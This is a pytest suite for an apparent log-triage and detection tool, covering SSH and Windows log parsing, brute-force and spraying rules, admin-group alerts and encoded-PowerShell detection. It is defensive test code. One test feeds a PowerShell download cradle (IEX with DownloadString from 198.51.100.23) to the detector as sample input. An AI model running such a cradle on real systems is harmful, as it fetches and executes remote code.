import base64
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from soc_triage import events as ev
from soc_triage.cli import main
from soc_triage.detections import Thresholds, decode_powershell, run_all
from soc_triage.events import Event
from soc_triage.parsers import parse_auth_log, parse_file, parse_windows_json

SAMPLES = Path(__file__).resolve().parent.parent / "sample_logs"
T0 = datetime(2026, 11, 10, 8, 0, tzinfo=timezone.utc)


def fail(ip, user, seconds, host="h"):
    return Event(T0 + timedelta(seconds=seconds), "test", ev.AUTH_FAILURE, host, user, ip, f"fail {user}")


def ok(ip, user, seconds, host="h"):
    return Event(T0 + timedelta(seconds=seconds), "test", ev.AUTH_SUCCESS, host, user, ip, f"ok {user}")


def rule_ids(alerts):
    return sorted(a.rule_id for a in alerts)


# --- parsers ----------------------------------------------------------------

def test_auth_log_parses_failed_accepted_and_skips_noise():
    lines = [
        "Nov 10 08:00:01 web01 sshd[1]: Invalid user admin from 203.0.113.5 port 5000",
        "Nov 10 08:00:01 web01 sshd[1]: Failed password for invalid user admin from 203.0.113.5 port 5000 ssh2",
        "Nov 10 08:00:09 web01 sshd[2]: Accepted publickey for deploy from 192.0.2.1 port 5001 ssh2",
        "Nov 10 08:01:00 web01 CRON[3]: pam_unix(cron:session): session opened for user root",
        "garbage line",
    ]
    events = list(parse_auth_log(lines, year=2026))
    assert [e.event_type for e in events] == [ev.AUTH_FAILURE, ev.AUTH_SUCCESS]
    assert events[0].user == "admin" and events[0].src_ip == "203.0.113.5"
    assert events[0].timestamp == datetime(2026, 11, 10, 8, 0, 1, tzinfo=timezone.utc)


def test_auth_log_iso_timestamps_are_normalised_to_utc():
    line = "2026-11-10T10:00:00+02:00 web01 sshd[9]: Failed password for root from 203.0.113.9 port 1 ssh2"
    (event,) = parse_auth_log([line])
    assert event.timestamp == datetime(2026, 11, 10, 8, 0, tzinfo=timezone.utc)


def test_windows_json_array_and_lines_give_same_events():
    records = [
        {"EventID": 4625, "TimeCreated": "2026-11-10T08:00:00Z", "TargetUserName": "bob", "IpAddress": "203.0.113.1"},
        {"EventID": 4732, "TimeCreated": "2026-11-10T08:01:00Z", "TargetUserName": "Administrators",
         "MemberName": "CN=eve,CN=Users,DC=corp,DC=example"},
        {"EventID": 9999, "TimeCreated": "2026-11-10T08:02:00Z"},
    ]
    as_array = list(parse_windows_json(json.dumps(records)))
    as_lines = list(parse_windows_json("\n".join(json.dumps(r) for r in records)))
    assert as_array == as_lines
    assert [e.event_type for e in as_array] == [ev.AUTH_FAILURE, ev.GROUP_MEMBER_ADDED]
    assert as_array[1].user == "eve"


def test_windows_dash_ip_becomes_empty():
    (event,) = parse_windows_json(json.dumps(
        [{"EventID": 4625, "TimeCreated": "2026-11-10T08:00:00Z", "TargetUserName": "x", "IpAddress": "-"}]))
    assert event.src_ip == ""


# --- brute force and spraying ----------------------------------------------

def test_brute_force_needs_threshold_inside_window():
    below = [fail("203.0.113.1", "root", i * 10) for i in range(9)]
    assert rule_ids(run_all(below)) == []
    above = [fail("203.0.113.1", "root", i * 10) for i in range(10)]
    assert rule_ids(run_all(above)) == ["AUTH-001"]


def test_slow_failures_spread_out_do_not_alert():
    # 12 failures, one every 10 minutes: never 10 inside a 5-minute window
    slow = [fail("203.0.113.1", "root", i * 600) for i in range(12)]
    assert run_all(slow) == []


def test_many_usernames_is_spraying_not_brute_force():
    spray = [fail("198.51.100.7", f"user{i % 6}", i * 5) for i in range(12)]
    alerts = run_all(spray)
    assert rule_ids(alerts) == ["AUTH-002"]
    assert alerts[0].details["targeted_users"] == [f"user{i}" for i in range(6)]


def test_success_after_failures_is_critical_for_same_account():
    events = [fail("203.0.113.1", "root", i) for i in range(6)] + [ok("203.0.113.1", "root", 10)]
    alerts = [a for a in run_all(events) if a.rule_id == "AUTH-003"]
    assert len(alerts) == 1 and alerts[0].severity == "critical"


def test_success_after_old_failures_does_not_alert():
    events = [fail("203.0.113.1", "root", i) for i in range(6)] + [ok("203.0.113.1", "root", 3600)]
    assert "AUTH-003" not in rule_ids(run_all(events))


def test_user_typo_then_login_is_quiet():
    events = [fail("192.0.2.5", "bob", i * 20) for i in range(3)] + [ok("192.0.2.5", "bob", 70)]
    assert run_all(events) == []


# --- account changes --------------------------------------------------------

def _acct(kind, user, minutes, **extra):
    return Event(T0 + timedelta(minutes=minutes), "test", kind, "WS1", user, "", kind, extra)


def test_new_account_made_admin_quickly_is_critical():
    events = [_acct(ev.ACCOUNT_CREATED, "eve", 0), _acct(ev.GROUP_MEMBER_ADDED, "eve", 5, group="Administrators")]
    alerts = run_all(events)
    assert rule_ids(alerts) == ["ACCT-001", "ACCT-003"]
    assert alerts[0].severity == "critical"


def test_existing_account_made_admin_is_high():
    alerts = run_all([_acct(ev.GROUP_MEMBER_ADDED, "sam", 0, group="Domain Admins")])
    assert rule_ids(alerts) == ["ACCT-002"] and alerts[0].severity == "high"


def test_non_privileged_group_is_ignored():
    assert run_all([_acct(ev.GROUP_MEMBER_ADDED, "sam", 0, group="Finance-Readers")]) == []


# --- PowerShell ---------------------------------------------------------------

def _ps(cmd, image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"):
    return Event(T0, "test", ev.PROCESS_CREATED, "WS1", "u", "", cmd, {"image": image, "command_line": cmd})


def _enc(script):
    return base64.b64encode(script.encode("utf-16-le")).decode()


@pytest.mark.parametrize("flag", ["-e", "-ec", "-en", "-enc", "-EncodedCommand", "/enc", "-ENCODEDCOMMAND"])
def test_encoded_flag_variants_are_detected(flag):
    alerts = run_all([_ps(f"powershell.exe -nop {flag} {_enc('Get-Date')}")])
    assert rule_ids(alerts) == ["EXEC-001"]
    assert alerts[0].details["decoded_command"] == "Get-Date"
    assert alerts[0].severity == "medium"


@pytest.mark.parametrize("cmd", [
    "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
    "powershell.exe -ex bypass -File x.ps1",
    "powershell.exe -Command Get-Process",
])
def test_plain_powershell_is_not_flagged(cmd):
    assert run_all([_ps(cmd)]) == []


def test_download_cradle_raises_severity():
    cradle = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"
    (alert,) = run_all([_ps(f"pwsh.exe -enc {_enc(cradle)}", image="C:\\Program Files\\PowerShell\\7\\pwsh.exe")])
    assert alert.severity == "high"
    assert "downloadstring" in alert.description


def test_encoded_flag_on_other_process_is_ignored():
    assert run_all([_ps(f"tool.exe -enc {_enc('x')}", image="C:\\tools\\tool.exe")]) == []


def test_decode_rejects_garbage():
    assert decode_powershell("not*base64") is None


# --- end to end on the sample scenario ---------------------------------------

def test_sample_scenario_end_to_end():
    events = parse_file(SAMPLES / "auth.log", year=2026) + parse_file(SAMPLES / "windows_security.jsonl")
    ids = rule_ids(run_all(events))
    assert ids == sorted([
        "AUTH-001", "AUTH-001", "AUTH-002", "AUTH-003",
        "ACCT-001", "ACCT-001", "ACCT-003", "ACCT-003",
        "EXEC-001", "EXEC-002", "EVADE-001",  # WINWORD -> powershell in 4688 fires both EXEC rules
    ])


def test_cli_json_and_fail_on(tmp_path, capsys):
    out = tmp_path / "alerts.json"
    code = main(["scan", str(SAMPLES / "windows_security.jsonl"), "--output", "json",
                 "--out-file", str(out), "--fail-on", "critical"])
    assert code == 1
    data = json.loads(out.read_text(encoding="utf-8"))
    assert {a["rule_id"] for a in data} >= {"EXEC-001", "ACCT-003", "EVADE-001"}


def test_cli_missing_file_returns_2(tmp_path):
    assert main(["scan", str(tmp_path / "nope.log")]) == 2


def test_thresholds_are_tunable():
    events = [fail("203.0.113.1", "root", i) for i in range(4)]
    assert run_all(events) == []
    assert rule_ids(run_all(events, Thresholds(brute_force_count=3))) == ["AUTH-001"]
